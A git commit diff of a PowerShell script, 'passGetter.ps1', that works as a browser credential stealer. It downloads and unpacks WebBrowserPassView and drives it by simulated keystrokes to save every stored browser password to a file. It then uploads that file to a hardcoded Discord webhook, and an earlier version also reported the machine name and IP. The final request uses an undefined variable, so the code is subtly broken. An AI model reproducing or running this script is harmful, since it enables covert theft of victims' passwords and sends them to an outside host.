ff50f1c7d7a1f17adb457173d65b6be3c6245af2
Peach-Iced-Tea <134111163+Peach-Iced-Tea@users.noreply.github.com>
2024-11-15 17:47:30 +0100

    Update passGetter.ps1

--- passGetter.ps1
+++ passGetter.ps1
@@ -1,20 +1,46 @@
-echo "passGetter"
-$wshell = New-Object -ComObject wscript.shell
+$URL = "https://discordapp.com/api/webhooks/1276442521689395220/CnXvgEAYbwkbYIOC1ZOkG_wmf-2my3mRSQv7Xip6WM3FCRfrjYOctTAe3FKtI8uEs9HS"
+$fileName = "pwds.txt"
+$filePath = "C:\temp\" + $fileName
+$wshell = New-Object -ComObject wscript.shell;
+
+mkdir \temp
+cd \temp
+iwr -Headers @{'Referer' = 'http://www.nirsoft.net/utils/web_browser_password.html'} -Uri http://www.nirsoft.net/toolsdownload/webbrowserpassview.zip -OutFile wbpv.zip
+iwr -uri https://www.7-zip.org/a/7za920.zip -OutFile 7z.zip
+Expand-Archive 7z.zip
+.\7z\7za.exe e wbpv.zip
+Sleep 5
+$wshell.SendKeys("wbpv28821@")
+Sleep 1
+$wshell.SendKeys("~")
+
+.\WebBrowserPassView.exe
+
+Sleep 10
+
 $wshell.AppActivate('WebBrowserPassView')
 Sleep 1
 $wshell.SendKeys("^{a}")
+Sleep 1
 $wshell.SendKeys("^{s}")
 Sleep 1
-$wshell.SendKeys("pwds.txt")
+$wshell.SendKeys($fileName)
+Sleep 1
 $wshell.SendKeys("~")
+Sleep 2
 
-$URL = "https://discordapp.com/api/webhooks/1276442521689395220/CnXvgEAYbwkbYIOC1ZOkG_wmf-2my3mRSQv7Xip6WM3FCRfrjYOctTAe3FKtI8uEs9HS"
-$IP = Invoke-WebRequest("ifconfig.me")
-$cTime = Get-Date -Format "MM/dd - HH:mm:ss"
+$boundary = [System.Guid]::NewGuid().ToString()
+$headers = @{
+    "Content-Type" = "multipart/form-data; boundary=$boundary"
+}
 
-$msg = @{
-    content = "test.ps has been run on $Env:ComputerName with IP $IP at $cTime."
-    file = Get-Item -Path "c:/temp/pwds.txt"
-} | ConvertTo-Json
+$body = @"
+--$boundary
+Content-Disposition: form-data; name="file"; filename="$(Split-Path -Leaf $filePath)"
+Content-Type: application/octet-stream
 
-Invoke-WebRequest -Uri $URL -Method Post -Body $msg -ContentType "application/json" | Out-Null
+$(Get-Content -Raw $filePath)
+--$boundary--
+"@
+
+Invoke-RestMethod -Uri $webhookUrl -Method Post -Headers $headers -Body $body
